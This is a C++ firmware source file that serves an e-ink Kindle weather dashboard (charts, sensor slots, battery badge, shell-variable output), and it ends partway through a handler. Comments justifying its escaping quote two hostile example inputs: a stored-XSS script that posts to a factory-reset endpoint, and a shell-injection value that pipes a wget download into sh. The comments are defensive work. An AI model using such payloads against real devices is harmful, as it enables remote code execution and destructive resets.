#include "KindleDashboard.h"

#ifdef FEATURE_KINDLE_DASHBOARD

#include <Arduino.h>
#include <ESPAsyncWebServer.h>
#include <time.h>
#include <new>
#include <memory>     // shared_ptr — the BMP filler owns its state through one
#include <math.h>

#include "../pipeline/DataPipeline.h"
#include "../pipeline/TrendRing.h"
#include "../utils/MutexGuard.h"
#include "../core/Globals.h"
#include "DashboardStrings.h"
#include "RefreshCadence.h"
#include "KindleSkin.h"                 // config.kindle -> face, weight, formats
#include "KindleChartBmp.h"             // ChartBmpCtx / ChartBmpReader
#include "KindleSlotStore.h"            // the configurable slot list
#ifdef FEATURE_ESPNOW_INGEST
#  include "../espnow/EspNowIngest.h"   // espnowAnyBatteryWarn()
#endif

#ifdef MODULE_FORECAST_ENABLED
#  include "../modules/ForecastModule.h"
#endif

static constexpr int PAGE_W  = KINDLE_PAGE_W;
static constexpr int CHART_W = kdPx(560);
static constexpr int CHART_H = kdPx(200);

static const char* outdoorSensorId() {
    return (config.kindle.outdoorSensor[0] != '\0') ? config.kindle.outdoorSensor : KINDLE_OUTDOOR_SENSOR;
}

static const char* indoorSensorId() {
    return (config.kindle.indoorSensor[0] != '\0') ? config.kindle.indoorSensor : KINDLE_INDOOR_SENSOR;
}

// ---------------------------------------------------------------------------
// Reading the current values
// ---------------------------------------------------------------------------
struct Latest {
    float    value = NAN;
    uint32_t ts    = 0;
    bool     ok    = false;
    // Carried from the reading rather than configured per slot. A metric's
    // unit is a property of the sensor that produced it — an SDS011 knows its
    // PM is µg/m³ and a BH1750 knows its light is lux — so asking the reader to
    // type it into a slot would be asking them to repeat something the
    // pipeline already knows, and to get it wrong.
    char     unit[12] = {0};
};

static Latest latestOf(const char* sensorId, const char* metric) {
    Latest out;
    SensorReading r;
    // The same 5 ms budget ProcessingTask allows itself: a dashboard render
    // must never be the reason a reading is dropped.
    MutexGuard g(webDataMutex, pdMS_TO_TICKS(5));
    if (g.isLocked() && webRingBuf.findLast(sensorId, metric, r)) {
        out.value = r.value;
        out.ts    = r.timestamp;
        out.ok    = true;
        strncpy(out.unit, r.unit, sizeof(out.unit) - 1);
    }
    return out;
}

/// The reading a slot names, with the same humidity preference the fixed
/// zones have always applied: a self-heating-corrected figure when the sensor
/// publishes one. Routed through here rather than through latestOf() directly
/// so a slot configured as plain "humidity" gets the corrected value, which is
/// what the reader means and what the page used to show.
static Latest slotReading(const KindleSlot& s);

// The humidity to show, preferring the self-heating-corrected figure.
//
// A BME280 or BME688 on a board that runs WiFi reads warm, and relative
// humidity is relative TO a temperature — so a warm sensor reports a room
// drier than it is. Both plugins publish "humidity_amb": the same air
// re-expressed at the true ambient temperature, by way of a dew point that is
// invariant under heating the sensor.
//
// Falling back to the raw figure rather than showing nothing: a sensor with no
// correction configured publishes no corrected figure at all (it would be a
// copy of the raw one), and one whose derived pair was dropped as out of range
// still has a humidity worth printing.
static Latest humidityOf(const char* sensorId) {
    Latest corrected = latestOf(sensorId, "humidity_amb");
    if (corrected.ok) return corrected;
    return latestOf(sensorId, "humidity");
}

static Latest slotReading(const KindleSlot& s) {
    if (strcmp(s.metric, "humidity") == 0) return humidityOf(s.sensorId);
    return latestOf(s.sensorId, s.metric);
}

// ---------------------------------------------------------------------------
// Formatting
// ---------------------------------------------------------------------------
// One decimal by default. A tenth of a degree is the most an e-ink glance can
// use, and two decimals make the big type wrap.
//
// Zero is offered as a setting (config.kindle.tempDecimals) rather than as a
// second opinion about precision: a whole-degree page is a legitimately
// different thing to want from across a room, and the reading it drops was
// never load-bearing. Anything above one is not offered, because the column
// has no room for it.
static void fmtTemp(char* buf, size_t n, float v, int dec = 1) {
    if (!isfinite(v)) { snprintf(buf, n, "--"); return; }
    snprintf(buf, n, dec ? "%.1f" : "%.0f", (double)v);
}

static void fmtInt(char* buf, size_t n, float v) {
    if (!isfinite(v)) { snprintf(buf, n, "--"); return; }
    snprintf(buf, n, "%.0f", (double)v);
}


// ---------------------------------------------------------------------------
// Barometric tendency
// ---------------------------------------------------------------------------
// The three-hour pressure change is the one genuinely predictive number a
// home station can produce, and TrendRing already stores pressure hourly —
// it was simply never shown. Bands follow the usual synoptic convention:
// 1.6 hPa / 3 h is "rapid", 0.5 is the threshold for calling any direction.
struct Tendency { bool have = false; float delta = 0.0f; const char* word = ""; const char* arrow = ""; };

static Tendency pressureTendency(const TrendRing::Hour* h) {
    Tendency t;
    const TrendRing::Hour& now  = h[TrendRing::HOURS - 1];
    const TrendRing::Hour& then = h[TrendRing::HOURS - 4];   // three hours back
    if (now.count == 0 || then.count == 0) return t;

    t.delta = (now.sum / now.count) - (then.sum / then.count);
    t.have  = true;
    if      (t.delta >=  1.6f) { t.word = KD_T("rising fast",  "расте бързо"); t.arrow = "&#8593;"; }
    else if (t.delta >=  0.5f) { t.word = KD_T("rising",       "расте");       t.arrow = "&#8599;"; }
    else if (t.delta >  -0.5f) { t.word = KD_T("steady",       "без промяна"); t.arrow = "&#8594;"; }
    else if (t.delta >  -1.6f) { t.word = KD_T("falling",      "пада");        t.arrow = "&#8600;"; }
    else                       { t.word = KD_T("falling fast", "пада бързо");  t.arrow = "&#8595;"; }
    return t;
}

// ---------------------------------------------------------------------------
// The trend chart
// ---------------------------------------------------------------------------
// Two series over 24 hours. The outdoor series is drawn as a BAND between its
// hourly min and max with the mean as a solid line through it; indoor is a
// dashed mean line only.
//
// The band is the point. TrendRing keeps min/max per hour precisely so an
// overnight excursion is visible, and a mean-only line throws that away — a
// night that dipped to -3 and recovered by dawn looks identical to one that
// sat at +2. It also costs nothing: the data was already being stored.
//
// The band is a flat #d8d8d8 wash with a #8f8f8f outline. It was hatched at
// first, on the belief that 16-level e-ink dithers mid-greys into noise at
// this size; that was wrong. Flat, well-separated tones each land on their own
// level and render solid, and over a wash the hatch was texture on texture —
// two bands that nearly touch read as one muddy mass.
//
// Gaps break both the band and the lines instead of interpolating. A flat
// line through a four-hour outage reads as "it was steady", which is a lie.
static void appendChart(String& out,
                        const TrendRing::Hour* a, const TrendRing::Hour* b,
                        bool haveA, bool haveB) {
    float lo =  1e9f, hi = -1e9f;
    for (int i = 0; i < TrendRing::HOURS; i++) {
        if (haveA && a[i].count) { if (a[i].min < lo) lo = a[i].min; if (a[i].max > hi) hi = a[i].max; }
        if (haveB && b[i].count) { if (b[i].min < lo) lo = b[i].min; if (b[i].max > hi) hi = b[i].max; }
    }
    if (lo > hi) {
        out += F(KD_T("<p class=\"note\">The 24 hour record fills as readings arrive.</p>",
                      "<p class=\"note\">24-часовият запис се попълва с постъпването на данни.</p>"));
        return;
    }
    float pad = (hi - lo) * 0.06f;
    if (pad < 0.4f) pad = 0.4f;
    lo -= pad; hi += pad;
    const float span = hi - lo;

    const int L = kdPx(40), R = CHART_W - kdPx(4), T = kdPx(10), B = CHART_H - kdPx(26);
    const float dx = (float)(R - L) / (float)(TrendRing::HOURS - 1);

    // Local lambdas would be tidier, but this file targets a toolchain shared
    // with the 4 MB C3 build and plain helpers keep the generated code small.
    #define KD_X(i)   (L + (int)(dx * (float)(i)))
    #define KD_Y(v)   (T + (int)((hi - (v)) / span * (float)(B - T)))

    out += F("<svg class=\"chart\" width=\""); out += CHART_W;
    out += F("\" height=\""); out += CHART_H;
    out += F("\" viewBox=\"0 0 "); out += CHART_W; out += ' '; out += CHART_H;
    out += F("\">");

    // Three-hourly verticals, drawn first so the band and lines cover them.
    // They are the ruler that lets the eye carry a point on the curve down to
    // the hour axis, which six-hourly labels alone do not: between two labels
    // there was nothing to count against. Lighter than the horizontals on
    // purpose — this is scaffolding, not data.
    for (int i = 0; i < TrendRing::HOURS; i += 3) {
        out += F("<line class=\"vgrid\" x1=\""); out += KD_X(i);
        out += F("\" y1=\""); out += T;
        out += F("\" x2=\""); out += KD_X(i);
        out += F("\" y2=\""); out += B; out += F("\"/>");
    }
    // 24 hours is not a multiple of 3 from the right-hand end, and "now" is
    // the one hour always worth a line of its own.
    out += F("<line class=\"vgrid\" x1=\""); out += KD_X(TrendRing::HOURS - 1);
    out += F("\" y1=\""); out += T;
    out += F("\" x2=\""); out += KD_X(TrendRing::HOURS - 1);
    out += F("\" y2=\""); out += B; out += F("\"/>");

    // Five horizontal rules, the lowest doubling as the baseline. Three
    // made the scale too coarse to read a couple of degrees off.
    for (int k = 0; k <= 4; k++) {
        const float v = hi - span * (float)k / 4.0f;
        const int   y = T + (int)((float)(B - T) * (float)k / 4.0f);
        out += F("<line class=\""); out += (k == 4 ? "base" : "grid");
        out += F("\" x1=\""); out += L; out += F("\" y1=\""); out += y;
        out += F("\" x2=\""); out += R; out += F("\" y2=\""); out += y; out += F("\"/>");
        char lbl[12]; fmtInt(lbl, sizeof(lbl), v);
        out += F("<text class=\"ax\" x=\""); out += L - kdPx(7);
        out += F("\" y=\""); out += y + kdPx(4);
        out += F("\" text-anchor=\"end\">"); out += lbl; out += F("</text>");
    }

    // Outdoor min/max band, one polygon per contiguous run of live hours.
    if (haveA) {
        int i = 0;
        while (i < TrendRing::HOURS) {
            if (a[i].count == 0) { i++; continue; }
            int j = i;
            while (j + 1 < TrendRing::HOURS && a[j + 1].count) j++;
            if (j > i) {                      // a single hour has no width to fill
                String d;
                for (int k = i; k <= j; k++) {
                    d += (k == i) ? 'M' : 'L';
                    d += KD_X(k); d += ' '; d += KD_Y(a[k].max); d += ' ';
                }
                for (int k = j; k >= i; k--) {
                    d += 'L'; d += KD_X(k); d += ' '; d += KD_Y(a[k].min); d += ' ';
                }
                d += 'Z';
                out += F("<path class=\"band\" d=\""); out += d; out += F("\"/>");
            }
            i = j + 1;
        }
    }

    // Mean lines on top of the band.
    for (int sIdx = 0; sIdx < 2; sIdx++) {
        const TrendRing::Hour* h = sIdx ? b : a;
        if (!(sIdx ? haveB : haveA)) continue;
        String d;
        bool pen = false;
        for (int i = 0; i < TrendRing::HOURS; i++) {
            if (h[i].count == 0) { pen = false; continue; }
            d += pen ? 'L' : 'M';
            d += KD_X(i); d += ' '; d += KD_Y(h[i].sum / h[i].count); d += ' ';
            pen = true;
        }
        if (d.length()) {
            out += F("<path class=\""); out += (sIdx ? "l-in" : "l-out");
            out += F("\" d=\""); out += d; out += F("\"/>");
        }
    }

    for (int i = 0; i < TrendRing::HOURS; i += 6) {
        out += F("<text class=\"ax\" x=\""); out += KD_X(i);
        out += F("\" y=\""); out += CHART_H - kdPx(8);
        out += F("\" text-anchor=\"middle\">-");
        out += (TrendRing::HOURS - 1 - i);
        out += F("h</text>");
    }
    // The right-hand edge is now, and the stride above never lands on it.
    // Leaving it bare made the axis read as if it stopped five hours ago.
    out += F("<text class=\"ax\" x=\""); out += KD_X(TrendRing::HOURS - 1);
    out += F("\" y=\""); out += CHART_H - kdPx(8);
    out += F("\" text-anchor=\"end\">" KD_T("now", "сега") "</text>");

    #undef KD_X
    #undef KD_Y
    out += F("</svg>");
}

// One legend swatch. It has to be drawn with the same stroke as the line it
// stands for — .l-out #000/3, .l-in #777/2 dashed — or the key describes a
// chart the reader is not looking at, which is exactly what it did before.
// Emitted rather than written as a literal so it scales with the page.
static void appendKeySwatch(String& out, const char* colour, int width, bool dashed) {
    out += F("<svg width=\"");  out += kdPx(26);
    out += F("\" height=\"");   out += kdPx(9);
    out += F("\"><line x1=\"0\" y1=\""); out += kdPx(5);
    out += F("\" x2=\"");       out += kdPx(26);
    out += F("\" y2=\"");       out += kdPx(5);
    out += F("\" stroke=\"");   out += colour;
    out += F("\" stroke-width=\""); out += kdPx(width);
    if (dashed) {
        out += F("\" stroke-dasharray=\""); out += kdPx(7);
        out += ' ';                         out += kdPx(5);
    }
    out += F("\"/></svg>");
}

// The battery warning badge.
//
// WHERE, AND WHY THERE
// --------------------
// Top right of the outdoor block, level with its label, in the only piece of
// empty space on the page — right of the humidity figure and left of the
// column rule. Everything else here is a measurement; the one thing that is
// not competes with nothing.
//
// DRAWN, NOT TYPED
// ----------------
// Inline SVG rather than a character. The reader's font is whatever the device
// firmware ships and its coverage varies; a glyph that renders as a box is
// worse than no warning at all, because it reads as a rendering fault rather
// than as a low battery. Every stroke here is a path, so it looks the same on
// every firmware.
//
// A DARK FILL AND A HOLE THROUGH IT
// ---------------------------------
// The panel is greyscale and the page is otherwise light, so a solid black
// plate is the only thing on it that reads as an alarm at arm's length. The
// battery outline and the exclamation are cut OUT of it in white rather than
// drawn on top: on a screen with no colour, inverted is the loudest a small
// mark gets.
static void appendBatteryBadge(String& out) {
    const int w = kdPx(46), h = kdPx(22), r = kdPx(3);

    out += F("<svg class=\"bw\" width=\""); out += w;
    out += F("\" height=\"");                 out += h;
    out += F("\" viewBox=\"0 0 ");            out += w;
    out += ' ';                               out += h;
    out += F("\">");

    // The plate.
    out += F("<rect x=\"0\" y=\"0\" width=\""); out += w;
    out += F("\" height=\"");                     out += h;
    out += F("\" rx=\"");                         out += r;
    out += F("\" fill=\"#000\"/>");

    // Battery body, knocked through in white: a filled shell with the inside
    // punched back to black, which is a stroke drawn as two rects because an
    // e-ink panel renders a 1 px stroke unevenly at this size.
    const int bx = kdPx(7), by = kdPx(6), bw = kdPx(24), bh = kdPx(10), t2 = kdPx(2);
    out += F("<rect x=\""); out += bx;
    out += F("\" y=\"");   out += by;
    out += F("\" width=\"");  out += bw;
    out += F("\" height=\""); out += bh;
    out += F("\" fill=\"#fff\"/>");
    out += F("<rect x=\""); out += bx + t2;
    out += F("\" y=\"");   out += by + t2;
    out += F("\" width=\"");  out += bw - 2 * t2;
    out += F("\" height=\""); out += bh - 2 * t2;
    out += F("\" fill=\"#000\"/>");

    // The terminal nub.
    out += F("<rect x=\""); out += bx + bw;
    out += F("\" y=\"");   out += by + kdPx(3);
    out += F("\" width=\"");  out += kdPx(3);
    out += F("\" height=\""); out += bh - kdPx(6);
    out += F("\" fill=\"#fff\"/>");

    // The exclamation, to the right of the cell. Two marks and a gap, so it
    // survives being scaled down with KINDLE_PAGE_W.
    const int ex = kdPx(38);
    out += F("<rect x=\""); out += ex;
    out += F("\" y=\"");   out += kdPx(5);
    out += F("\" width=\"");  out += kdPx(3);
    out += F("\" height=\""); out += kdPx(8);
    out += F("\" fill=\"#fff\"/>");
    out += F("<rect x=\""); out += ex;
    out += F("\" y=\"");   out += kdPx(15);
    out += F("\" width=\"");  out += kdPx(3);
    out += F("\" height=\""); out += kdPx(3);
    out += F("\" fill=\"#fff\"/>");

    out += F("</svg>");
}

/// Whether any battery node is low enough to warrant the badge.
///
/// One place, so the renderer and the web interface cannot disagree about what
/// counts as a warning: both ask the same espnowAnyBatteryWarn(), which is
/// batteryShouldWarn() over the same history. A build without the radio has no
/// battery nodes and no badge.
static bool batteryWarningActive() {
#ifdef FEATURE_ESPNOW_INGEST
    return espnowAnyBatteryWarn();
#else
    return false;
#endif
}

// Smallest and largest hourly extreme across the window, for the caption.
static bool windowExtremes(const TrendRing::Hour* h, float& mn, float& mx) {
    mn = 1e9f; mx = -1e9f;
    for (int i = 0; i < TrendRing::HOURS; i++) {
        if (!h[i].count) continue;
        if (h[i].min < mn) mn = h[i].min;
        if (h[i].max > mx) mx = h[i].max;
    }
    return mn <= mx;
}

// "4 min" / "3 h" — an age the reader can judge without doing arithmetic
// against a clock they may not be able to see.
static void appendAge(String& out, uint32_t ts, uint32_t now) {
    if (ts == 0 || now <= ts) return;
    const uint32_t mins = (now - ts) / 60u;
    if (mins < 2) return;                       // fresh; saying so is noise
    out += F(" &middot; ");
    if (mins < 60) { out += mins; out += F(KD_T(" min old", " мин"));  }
    else           { out += (mins / 60); out += F(KD_T(" h old", " ч")); }
}

// Text into HTML.
//
// EVERY STRING ON THIS PAGE USED TO BE A LITERAL. Slot labels are the first
// that a person types, and they arrive through POST /api/kindle/slots, are
// stored, and are rendered back on a page served without authentication — the
// exact shape of a stored cross-site scripting bug. A label of
// `<script>fetch('/api/factory_reset',{method:'POST'})</script>` would run in
// the browser of whoever opened the dashboard.
//
// The reader itself is a 2014 browser that would probably not manage the
// attack, but /kindle is reachable from any browser on the network, and "the
// intended client is too old to be exploited" is not a security property.
static void appendEscaped(String& out, const char* s) {
    if (!s) return;
    for (const char* q = s; *q; q++) {
        switch (*q) {
            case '&':  out += F("&amp;");  break;
            case '<':  out += F("&lt;");   break;
            case '>':  out += F("&gt;");   break;
            case '"':  out += F("&quot;"); break;
            case '\'': out += F("&#39;");  break;
            default:   out += *q;          break;
        }
    }
}


// ---------------------------------------------------------------------------
// Week strip
// ---------------------------------------------------------------------------
// The current week with today inverted. It fills the foot of the page, which
// was empty at 695 of 800 px, and answers the question an e-ink panel on a
// shelf is otherwise bad at: what day is it.
//
// Monday-first, the local convention. tm_wday counts from Sunday, so the
// shift is (wday + 6) % 7 rather than wday itself — getting that backwards
// puts today in the wrong column on Sundays only, which is exactly the sort
// of bug that survives a casual look.
static void appendWeek(String& out, uint32_t now) {
    if (now < 1000000000u) return;

    const time_t t = (time_t)now;
    struct tm tmv;
    if (localtime_r(&t, &tmv) == nullptr) return;

    const int todayIdx = (tmv.tm_wday + 6) % 7;      // 0 = Monday

    // The month, set as a section heading like the two above it. The day
    // numbers alone say which day it is but not which month, which the
    // masthead used to answer.
    //
    // A week can straddle two months, and then one name is a lie about half
    // the row — so name both. Taken from Monday and Sunday rather than from
    // today, since today may be either side of the boundary.
    struct tm mv, sv;
    const time_t monday = t - (time_t)todayIdx * 86400;
    const time_t sunday = monday + 6 * 86400;
    if (localtime_r(&monday, &mv) != nullptr && localtime_r(&sunday, &sv) != nullptr) {
        out += F("<div class=\"rule\"></div><div class=\"sec sec-wk\">");
        out += kdMonth(mv.tm_mon);
        if (sv.tm_mon != mv.tm_mon) {
            out += F(" &ndash; ");
            out += kdMonth(sv.tm_mon);
        }
        out += F("</div>");
    } else {
        out += F("<div class=\"rule\"></div>");
    }

    // Walk back to Monday in whole days. Doing it on the epoch rather than on
    // tm_mday keeps month and year ends correct for free.
    out += F("<table class=\"wk\"><tr>");
    for (int i = 0; i < 7; i++) {
        const time_t day = t + (time_t)(i - todayIdx) * 86400;
        struct tm dv;
        if (localtime_r(&day, &dv) == nullptr) continue;
        out += F("<td class=\"");
        if (i == todayIdx)   out += F("wd wd-now");
        else if (i >= 5)     out += F("wd wd-we");   // Sat, Sun
        else                 out += F("wd");
        out += F("\"><div class=\"wd-n\">");
        out += kdWeekdayShort(i);
        out += F("</div><div class=\"wd-d\">");
        out += dv.tm_mday;
        out += F("</div></td>");
    }
    out += F("</tr></table>");
}

// ---------------------------------------------------------------------------
// The page
// ---------------------------------------------------------------------------
// Set like a printed almanac rather than a screen UI, because the medium is
// paper in every way that matters: reflective, static, greyscale, redrawn in
// full or not at all. So — rules instead of boxes, letterspaced small caps
// instead of chips, and the reader's own serif faces (Bookerly and Caecilia
// ship on the device) instead of a webfont that would cost bytes to render
// worse.
//
// Nothing here uses flexbox, grid, CSS variables or calc(). A current PQ94WIF
// on firmware 5.16.4 or later would support them; an older one would not, and
// tables with literal pixel values render the same on both. See the header for
// why that trade is made in favour of the old browser.
// The chart itself lives in KindleChartBmp.h — Arduino-free, so the host
// tests can render it and check the bytes. Only the serving is below.

void handleKindleGraph(AsyncWebServerRequest* req) {
    const KindleConfig skin = config.kindle;
    const bool     hiRes = (skin.fbinkResW > 600);
    const uint16_t W = hiRes ? 1000 : 560;
    const uint16_t H = hiRes ? 360  : 200;

    // A shared_ptr, AND THAT IS THE FIX, not a tidier spelling of the same
    // thing. The previous version held raw pointers and deleted them only on
    // the branch that runs when the last byte goes out, so a client that
    // disconnected mid-image leaked the context and the stream state — every
    // time. The client is a ten-year-old reader on wifi fetching this on a
    // timer, which is the population most likely to drop a connection, and
    // ~3 KB a go against this device's free heap is not many aborted requests
    // before it stops serving anything at all. The response object owns the
    // std::function; destroying it — on completion OR on abort — releases this.
    auto st = std::shared_ptr<ChartBmpReader>(new(std::nothrow) ChartBmpReader);
    if (!st) { req->send(503, "text/plain", "out of memory"); return; }

    const uint32_t now = (uint32_t)time(nullptr);
    st->ctx.haveOut = trendRing.series(outdoorSensorId(), "temperature", now, st->ctx.tOut);
    st->ctx.haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, st->ctx.tIn);
    st->ctx.init(W, H);
    st->begin();

    // A LENGTHED RESPONSE, NOT A CHUNKED ONE. The size is known before the
    // first byte, and the previous version sent it as Content-Length ON TOP OF
    // Transfer-Encoding: chunked — two framings that contradict each other,
    // where the length given was the unchunked size. A client that believed the
    // header read a truncated BMP; a proxy is entitled to reject the message
    // outright. Announcing the length also lets the reader show progress and
    // skips the per-chunk framing on a slow link.
    AsyncWebServerResponse* resp = req->beginResponse(
        "image/bmp", st->total,
        [st](uint8_t* buffer, size_t maxLen, size_t /*index*/) -> size_t {
            return st->read(buffer, maxLen);
        });

    // beginResponse allocates, and this device runs close enough to its heap
    // limit that "it returned null" is a real branch rather than a formality.
    if (!resp) { req->send(503, "text/plain", "out of memory"); return; }
    resp->addHeader("Cache-Control", "no-cache");
    req->send(resp);
}

// ---------------------------------------------------------------------------
// The page
// ---------------------------------------------------------------------------


// Emit one KEY="value" line with the value escaped for a POSIX shell.
//
// THE CONSUMER OF THIS FILE IS `.` — kindle/update_dash.sh sources it, as root,
// on a device with no security model to speak of. So every byte on the right of
// the `=` is code unless something makes it data, and one of the values is the
// forecast provider's free-text summary: an upstream API's string, or anything
// that can answer for it on an unencrypted link. A summary of
//
//     "; wget -O - http://x/y | sh; #
//
// is a shell command on the reader, not a weather description.
//
// Backslash-escaping the four characters that keep their meaning inside double
// quotes ("  \  $  `) makes the value inert; control characters are dropped
// outright because a newline would end the assignment whatever is escaped, and
// none of them belong in a label.
static void kdShellVar(AsyncResponseStream* s, const char* key, const char* val) {
    s->print(key);
    s->print("=\"");
    for (const char* p = val; p && *p; p++) {
        const unsigned char c = (unsigned char)*p;
        if (c < 0x20 || c == 0x7F) continue;
        if (c == '"' || c == '\\' || c == '$' || c == '`') s->print('\\');
        s->write(c);
    }
    s->print("\"\n");
}

/// The same, for the indexed keys (FC0_LABEL, WK3_NAME…).
static void kdShellVarN(AsyncResponseStream* s, const char* fmt, int i, const char* val) {
    char key[24];
    snprintf(key, sizeof(key), fmt, i);
    kdShellVar(s, key, val);
}

// ---------------------------------------------------------------------------
// The configurable slots
// ---------------------------------------------------------------------------
/// One resolved slot: the reading, formatted, with the label and unit it will
/// be drawn with. Shared by both renderers so a value cannot be rounded one way
/// on the reader and another in a browser.
struct KdResolved {
    char        text[24];   ///< the number, already at its decimals
    const char* unit;
    const char* label;
    bool        ok;
    uint32_t    ts;
};

/// Resolve the whole list against the live readings and pack it.
///
/// ONE CALL, USED BY BOTH RENDERERS. The FBInk page and this one differ in how
/// they draw a slot and not at all in which slots there are, so the visibility
/// rule, the unit conversion and the packing happen here once. Two copies of
/// this would be two chances to put a value in a different place depending on
/// which screen you were looking at.
static int kdResolveSlots(const KindleConfig& skin, uint32_t now,
                          KdResolved* out, KdSlotPlacement* place, int maxOut) {
    const KindleSlotList& list = kdSlots();

    KdResolved res[KindleSlotList::CAP];
    bool       visible[KindleSlotList::CAP] = {false};

    for (int i = 0; i < list.count && i < KindleSlotList::CAP; i++) {
        res[i] = KdResolved{};
        if (!list.slot[i].used()) continue;

        const KindleSlot& sl = list.slot[i];
        const Latest      rd = slotReading(sl);
        visible[i] = rd.ok;
        if (!rd.ok) continue;

        float       v    = rd.value;
        const char* unit = rd.unit;
        int         dec  = kdSlotDecimals(sl);

        // Pressure is the one metric the reader can re-unit, so it is the one
        // whose stored hPa is not what gets printed.
        if (strcmp(sl.metric, "pressure") == 0) {
            v    = kdPressureValue(rd.value, skin.pressureUnit);
            unit = kdPressureUnitLabel(skin.pressureUnit);
            dec  = kdPressureDecimals(skin.pressureUnit);
        } else if (strcmp(sl.metric, "temperature") == 0) {
            // The temperature decimals control predates slots and still wins:
            // it is the setting people actually turn, and having it apply to
            // the hero but not to a second temperature slot would be a puzzle.
            dec = skin.tempDecimals;
        }

        snprintf(res[i].text, sizeof(res[i].text), "%.*f", dec, (double)v);
        // The display unit, which is not always the sensor's: a temperature
        // wants the degree sign the page has always shown, not the pipeline's
        // machine-readable "C". Pressure is the exception — it was re-united
        // above and carries its own label.
        if (strcmp(sl.metric, "pressure") != 0) unit = kdSlotUnit(sl, unit);
        res[i].unit  = (sl.flags & KSLOTF_UNIT) ? unit : "";
        res[i].label = kdSlotLabel(sl);
        res[i].ok    = true;
        res[i].ts    = rd.ts;
    }

    // Row 0 shares with the clock, which is drawn top-right by both renderers
    // and is not a slot because it is not a reading.
    const int n = kdSlotsPack(list, visible, place, maxOut,
                              KSLOT_ROW_UNITS - KSLOT_CLOCK_UNITS);
    for (int k = 0; k < n; k++) out[k] = res[place[k].index];
    return n;
}

/// Emit the packed slots for the FBInk script.
static void emitSlots(AsyncResponseStream* s, const KindleConfig& skin, uint32_t now) {
    KdResolved      res[KindleSlotList::CAP];
    KdSlotPlacement place[KindleSlotList::CAP];
    const int n = kdResolveSlots(skin, now, res, place, KindleSlotList::CAP);

    const KindleSlotList& list = kdSlots();

    s->printf("SLOT_COUNT=%d\n", n);
    s->printf("SLOT_ROWS=%d\n", kdSlotsRowCount(place, n));

    char key[24];
    for (int k = 0; k < n; k++) {
        const KindleSlot& sl = list.slot[place[k].index];

        snprintf(key, sizeof(key), "SLOT%d_LABEL", k);  kdShellVar(s, key, res[k].label);
        snprintf(key, sizeof(key), "SLOT%d_VALUE", k);  kdShellVar(s, key, res[k].text);
        snprintf(key, sizeof(key), "SLOT%d_UNIT", k);   kdShellVar(s, key, res[k].unit);
        snprintf(key, sizeof(key), "SLOT%d_SENSOR", k); kdShellVar(s, key, sl.sensorId);
        snprintf(key, sizeof(key), "SLOT%d_METRIC", k); kdShellVar(s, key, sl.metric);

        s->printf("SLOT%d_SIZE=%u\n",  k, (unsigned)sl.size);
        s->printf("SLOT%d_ROW=%u\n",   k, (unsigned)place[k].row);
        s->printf("SLOT%d_COL=%u\n",   k, (unsigned)place[k].col);
        s->printf("SLOT%d_UNITS=%u\n", k, (unsigned)place[k].units);
        s->printf("SLOT%d_BOLD=%d\n",  k, (sl.flags & KSLOTF_BOLD) ? 1 : 0);

        // Age in minutes, and only when it was asked for and is real. A value
        // measured seconds ago and one measured yesterday look identical on an
        // e-ink panel that repaints every five minutes.
        unsigned ageMin = 0;
        if ((sl.flags & KSLOTF_AGE) && res[k].ts && now > res[k].ts)
            ageMin = (now - res[k].ts) / 60u;
        s->printf("SLOT%d_AGE_MIN=%u\n", k, ageMin);
    }
}

/// Draw the slots on rows [rowFrom, rowTo] into the HTML page.
///
/// Split by row because the clock occupies the top-right: row 0 goes inside the
/// hero table's left cell, and everything after it below the table at full
/// width. Passing the range rather than rendering twice into different buffers
/// keeps one description of a slot's markup.
///
/// The CSS class carries the size, so the type scale lives in the stylesheet
/// with every other size on this page rather than as inline styles the reader's
/// browser has to parse per element.
static void appendSlotRows(String& p, const KindleConfig& skin, uint32_t now,
                           uint8_t rowFrom, uint8_t rowTo) {
    KdResolved      res[KindleSlotList::CAP];
    KdSlotPlacement place[KindleSlotList::CAP];
    const int n = kdResolveSlots(skin, now, res, place, KindleSlotList::CAP);
    if (n == 0) return;

    const KindleSlotList& list = kdSlots();
    static const char* SZ[KSLOT_SIZE_COUNT] = { "sl-h", "sl-l", "sl-m", "sl-s" };

    int k = 0;
    while (k < n && place[k].row < rowFrom) k++;

    bool openTable = false;
    int  lastRow   = -1;

    for (; k < n && place[k].row <= rowTo; k++) {
        if ((int)place[k].row != lastRow) {
            if (openTable) p += F("</tr></table>");
            p += F("<table class=\"slots\"><tr>");
            openTable = true;
            lastRow   = place[k].row;
        }

        const KindleSlot& sl = list.slot[place[k].index];

        // Width as a percentage of the row, from the same twelfths the FBInk
        // renderer turns into pixels.
        p += F("<td class=\"slot ");
        p += SZ[sl.size < KSLOT_SIZE_COUNT ? sl.size : KSLOT_MEDIUM];
        p += F("\" width=\"");
        p += (int)((place[k].units * 100 + 6) / 12);   // rounded, sums to ~100
        p += F("%\">");

        p += F("<div class=\"lab\">");
        appendEscaped(p, res[k].label);
        // The battery badge belongs beside the first reading, which is where it
        // has always been — it warns about the node feeding this page.
        if (k == 0 && (skin.showFlags & KSHOW_BATTERY) && batteryWarningActive())
            appendBatteryBadge(p);
        p += F("</div>");

        p += F("<div class=\"val");
        if (sl.flags & KSLOTF_BOLD) p += F(" val-b");
        p += F("\">");
        p += res[k].text;
        if (res[k].unit && *res[k].unit) {
            p += F("<span class=\"unit\"> ");
            appendEscaped(p, res[k].unit);
            p += F("</span>");
        }

        if ((sl.flags & KSLOTF_AGE) && res[k].ts) {
            p += F("<span class=\"age\">");
            appendAge(p, res[k].ts, now);
            p += F("</span>");
        }
        p += F("</div></td>");
    }
    if (openTable) p += F("</tr></table>");
}

static void handleKindleData(AsyncWebServerRequest* req) {
    const Latest outT = latestOf(outdoorSensorId(), "temperature");
    const Latest outH = humidityOf(outdoorSensorId());
    const Latest outP = latestOf(outdoorSensorId(), "pressure");
    const Latest inT  = latestOf(indoorSensorId(),  "temperature");
    const Latest inH  = humidityOf(indoorSensorId());
    const Latest inA  = latestOf(indoorSensorId(),  "aqi");
    const uint32_t now = (uint32_t)time(nullptr);

    TrendRing::Hour tOut[TrendRing::HOURS];
    TrendRing::Hour tIn [TrendRing::HOURS];
    TrendRing::Hour tPress[TrendRing::HOURS];
    const bool haveOut = trendRing.series(outdoorSensorId(), "temperature", now, tOut);
    const bool haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, tIn);
    const bool haveP   = trendRing.series(outdoorSensorId(), "pressure",    now, tPress);

    KindleConfig skin = config.kindle;
    kdSkinClamp(skin);
    char buf[24];

    AsyncResponseStream* s = req->beginResponseStream("text/plain");

    // ── Outdoor ──
